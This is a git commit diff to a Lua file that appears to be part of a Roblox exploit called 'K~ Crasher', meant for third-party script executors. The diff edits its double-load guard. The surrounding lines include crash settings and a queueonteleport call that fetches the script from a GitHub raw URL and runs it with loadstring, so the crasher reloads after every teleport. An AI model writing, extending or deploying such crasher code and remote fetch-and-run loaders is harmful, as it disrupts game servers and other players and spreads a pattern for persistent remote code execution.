398b19b501e9116f6a5309cb3942293b0bb48511
BruhButNotBruhOk <68662833+CrisomoX@users.noreply.github.com>
2024-05-17 21:23:30 -0500

    Update iodf9s8jiosiuuisodfhuihjdfuaoshsafbiasfasfasfsafas.lua

--- iodf9s8jiosiuuisodfhuihjdfuaoshsafbiasfasfasfsafas.lua
+++ iodf9s8jiosiuuisodfhuihjdfuaoshsafbiasfasfasfsafas.lua
@@ -54,8 +54,8 @@ _G.CrashSettings = {
 }
 
 if _G.CrashSettings.Enabled ~= true then return end
-if _G.KCLOADED == true then return task.spawn(error, 'K~ Crasher is already loaded!') end
-_G.KCLOADED = true
+if KCLOADED == true then return task.spawn(error, 'K~ Crasher is already loaded! 0x1') end
+getgenv().KCLOADED = true
 -- VegaX use only!
 if identifyexecutor() == "VegaX" then
 	queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/CrisomoX/makeBoom/main/iodf9s8jiosiuuisodfhuihjdfuaoshsafbiasfasfasfsafas.lua'))()")
